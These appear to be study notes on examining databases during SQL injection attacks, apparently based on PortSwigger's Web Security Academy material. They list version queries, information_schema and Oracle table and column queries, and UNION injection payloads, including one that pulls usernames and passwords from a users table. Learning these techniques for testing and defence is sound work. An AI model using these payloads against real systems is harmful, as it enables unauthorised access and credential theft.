   ## Examining the database in SQL injection attacks
  
When exploiting [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.  
   
**A.Querying the database type and version**  

   		
 'Database type' | 'Query'
|--|--|
| Microsoft, MySQL	|	SELECT @@version |
|Oracle 		|			SELECT * FROM v$version
|PostgreSQL 	|			SELECT version() |

  
  
For example, you could use a `UNION` attack with the following input after identifying number of columns:  
<font color=ligreen>' UNION SELECT @@version--  

NOTE: You should try and use url encoded # also, if -- doesn't output the result  
  
**B. Listing the contents of the database**  
  
   
Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.  
You can query `information_schema.tables` to list the tables in the database:  
  
<font color=ligreen>SELECT * FROM information_schema.tables  
  
This returns output like the following:  
	
- TABLECATALOG |	 TABLESCHEMA | 	TABLENAME  | 	TABLETYPE
|:--: |:--:|:--:|--:|
MyDatabase | dbo | Products | BASE TABLE  |
MyDatabase| dbo |Users |BASE TABLE  |
MyDatabase |dbo |Feedback |BASE TABLE  |
  
This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.  
  
You can then query `information_schema.columns` to list the columns in individual tables:  
SELECT * FROM information_schema.columns WHERE table_name = 'Users'  
  
This returns output like the following:  


-	
|TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE | 
|:--:|:--:|:--:|:--:|:--:|
|MyDatabase | dbo | Users| UserId | int  |
MyDatabase| dbo| Users| Username| varchar  
MyDatabase| dbo| Users| Password| varchar  


	
This output shows the columns in the specified table and the data type of each column.  
  
   
NOTE: You can search information_schema.tables postgresql and information_schema.columns postgresql on google  
After finding the users tablename and the username column and password column inside that tablename  
	Use <font color=ligreen> '+UNION+SELECT+usercoulmnname,passwordcolumnname+FROM+tablename--  </font>
in-order to retrieve the actual data of that username column and password column.  
  
  
 Equivalent to information schema on Oracle  
  
On Oracle, you can obtain the same information with slightly different queries.  
You can list tables by querying `all_tables`:  
SELECT * FROM all_tables  
And you can list columns by querying `all_tab_columns`:  
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'